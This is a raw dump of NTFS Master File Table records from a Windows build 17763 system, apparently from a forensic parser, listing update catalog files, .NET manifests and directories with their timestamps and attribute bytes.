86681,Valid,In Use,File,3,3537,1,Package_5_for_KB4470788~31bf3856ad364e35~amd64~~17763.164.1.1.cat,,Not defined,Not defined,Not defined,Not defined,2019-03-19T10:58:08.915Z,2018-11-09T22:39:10.050Z,2019-03-19T10:58:10.086Z,2019-03-19T10:58:11.977Z,,,,,False,False,True,False,False,False,False,False,False,False,False,False,False,[],None,,None,None,None,None,None,None,None,None,None,,,,
86684,Valid,In Use,File,3,3537,1,Package_6_for_KB4470788~31bf3856ad364e35~amd64~~17763.164.1.1.cat,,Not defined,Not defined,Not defined,Not defined,2019-03-19T10:58:08.930Z,2018-11-09T22:39:10.269Z,2019-03-19T10:58:10.102Z,2019-03-19T10:58:11.977Z,,,,,False,False,True,False,False,False,False,False,False,False,False,False,False,[],None,,None,None,None,None,None,None,None,None,None,,,,
86687,Valid,In Use,File,3,3537,1,Package_7_for_KB4470788~31bf3856ad364e35~amd64~~17763.164.1.1.cat,,Not defined,Not defined,Not defined,Not defined,2019-03-19T10:58:08.930Z,2018-11-09T22:43:47.558Z,2019-03-19T10:58:10.118Z,2019-03-19T10:58:11.977Z,,,,,False,False,True,False,False,False,False,False,False,False,False,False,False,[],None,,None,None,None,None,None,None,None,None,None,,,,
86701,Valid,In Use,Directory,4,113310,0,f,,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.842Z,2025-11-24T13:37:12.912Z,2019-03-19T11:21:07.842Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00'}",,,,
86702,Valid,In Use,Directory,4,113310,0,r,,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.842Z,2025-11-24T13:37:12.912Z,2019-03-19T11:21:07.842Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00'}",,,,
86708,Valid,In Use,Directory,4,5565,0,AMC1AE~1.3
                                                8,,2019-03-19T11:21:13.139Z,2019-03-19T11:21:13.139Z,2025-11-24T13:36:46.317Z,2019-03-19T11:21:13.139Z,2019-03-19T11:21:13.139Z,2019-03-19T11:21:13.139Z,2019-03-19T11:21:13.139Z,2019-03-19T11:21:13.139Z,,,,,True,True,True,False,False,False,False,False,False,False,False,False,True,"[{'type': 16, 'name': '', 'vcn': 0, 'reference': 86708}, {'type': 48, 'name': '', 'vcn': 0, 'reference': 86708}, {'type': 48, 'name': '', 'vcn': 0, 'reference': 115706}, {'type': 144, 'name': '$I30', 'vcn': 0, 'reference': 115706}, {'type': 256, 'name': '$DSC', 'vcn': 0, 'reference': 115706}, {'type': 256, 'name': '$TXF_DATA', 'vcn': 0, 'reference': 86708}]",None,,None,None,None,None,None,None,None,None,"{'size': 19703626332373028, 'data': b'_\x00D\x00A\x00T\x00A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xb5\x10\x00\x00\x00\x00\x00\x00\x00\x16\x12\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x12\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11>\x11W\xdcE\xde\xd4\x01>\x11W\xdcE\xde\xd4\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x01\x03f\x00\x00\x00\x00\x00\xa9\xcf\x01\x00\x00\x00\x01\x00h\x00R\x00\x00\x00\x00\x00\xb4R\x01\x00\x00\x00\x04\x00lw\xe6\xd9E\xde\xd4\x01\xa5\xd8\xe8\xd9E\xde\xd4\x01\x1c+\xdc\xfaE\xde\xd4\x01\x06M\xeb\xd9E\xde\xd4\x01\x00@\x13\x00\x00\x00\x00\x0087\x13\x00\x00\x00\x00\x00 \x00\x04\x00W\x00\x05\x00\x08\x03h\x00t\x00t\x00p\x00.\x00s\x00y\x00s\x00\x00\x00\x00\x00\x00\x00\xb8R\x01\x00\x00\x00\x04\x00X\x00D\x00\x00\x00\x00\x00\xb4R\x01\x00\x00\x00\x04\x00>\x11W\xdcE\xde\xd4\x01>\x11W\xdcE\xde\xd4\x01>\x11W\xdcE\xde\xd4\x01>\x11W\xdcE\xde\xd4\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x01\x03r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00'}",,,,
86724,Valid,In Use,File,5,1735,0,SHS-03192019-041225-7-2f-17763.1.amd64fre.rs5_release.180914-1434.etl,,2019-03-19T11:12:25.587Z,2019-03-19T11:12:46.164Z,2019-03-19T11:12:46.164Z,2019-03-19T11:12:46.164Z,2019-03-19T11:12:25.587Z,2019-03-19T11:12:25.587Z,2019-03-19T11:12:25.587Z,2019-03-19T11:12:25.587Z,,,,,True,False,True,False,False,False,False,False,False,False,False,False,False,[],None,,None,None,None,None,None,None,None,None,None,,,,
86727,Valid,In Use,Directory,2,5565,0,amd64_netfx4-windowsbase_b03f5f7f11d50a3a_4.0.15713.205_none_37bb3bd39bc43b8,,2019-03-19T10:55:26.914Z,2019-03-19T10:55:26.914Z,2025-11-24T13:36:54.477Z,2019-03-19T10:55:26.914Z,2019-03-19T10:55:26.914Z,2019-03-19T10:55:26.914Z,2019-03-19T10:55:26.914Z,2019-03-19T10:55:26.914Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 19703626332373028, 'data': b""_\x00D\x00A\x00T\x00A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\x11\x03\x00\x00\x00\x00\x00\x00\x00:'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00""}",,,,
86743,Valid,In Use,File,2,3537,1,Package_7_for_KB4486553~31bf3856ad364e35~amd64~~10.0.1.2353.cat,,Not defined,Not defined,Not defined,Not defined,2019-03-19T10:55:19.258Z,2019-01-08T23:33:25.737Z,2019-03-19T10:55:21.320Z,2019-03-19T10:55:24.291Z,,,,,False,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 2}",None,None,None,None,None,None,None,,,,
86747,Valid,In Use,File,2,14932,0,$$_microsoft.net_framework64_v4.0.30319_46321ba736a30085.cdf-ms,,2018-09-15T07:31:34.428Z,2019-03-19T10:55:29.977Z,2025-11-24T10:06:29.212Z,2019-03-19T10:58:21.821Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 5066549580791808, 'last_vcn': 17}",None,None,None,None,None,None,"{'size': 19703626332373028, 'data': b'_\x00D\x00A\x00T\x00A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa2\x02\x00\x00\x00\x00\x00\x00\x01\x02*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00Y\x02\x00\x00\xff\xff\xff\xff\x82yG\x11A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa2\x02\x00\x00\x00\x00\x00\x00\x00\n""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00'}",,,,
86748,Valid,In Use,File,2,14932,0,$$_microsoft.net_framework64_v4.0.30319_wpf_647a02df72a14032.cdf-ms,,2018-09-15T07:31:34.428Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:58:21.821Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 1}",None,None,None,None,None,None,"{'size': 19703626332373028, 'data': b'_\x00D\x00A\x00T\x00A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa3\x02\x00\x00\x00\x00\x00\x00\x01\x02*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00_\x02\x00\x00\xff\xff\xff\xff\x82yG\x11A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa3\x02\x00\x00\x00\x00\x00\x00\x00(""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00'}",,,,
86755,Valid,In Use,File,2,14932,0,$$_microsoft.net_framework64_v4.0.30319_wpf_en-us_0242687c673a608c.cdf-ms,,2018-09-15T07:31:34.444Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:58:21.821Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 19703626332373028, 'data': b'_\x00D\x00A\x00T\x00A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa4\x02\x00\x00\x00\x00\x00\x00\x01\x02*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00e\x02\x00\x00\xff\xff\xff\xff\x82yG\x11\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa4\x02\x00\x00\x00\x00\x00\x00\x00>""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00'}",,,,
86756,Valid,In Use,File,2,14932,0,$$_microsoft.net_framework64_v4.0.30319_nativeimages_ae465c5139d1dacc.cdf-
                                                                                                            s,,2018-09-15T07:31:34.444Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:58:21.821Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 19703626332373028, 'data': b'_\x00D\x00A\x00T\x00A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa5\x02\x00\x00\x00\x00\x00\x00\x01\x02*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00k\x02\x00\x00\xff\xff\xff\xff\x82yG\x11\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa5\x02\x00\x00\x00\x00\x00\x00\x00\\""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00'}",,,,
86757,Valid,In Use,Directory,4,86754,0,f,,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,2025-11-24T13:37:13.287Z,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00'}",,,,
86758,Valid,In Use,Directory,4,86754,0,r,,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,2025-11-24T13:37:13.287Z,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x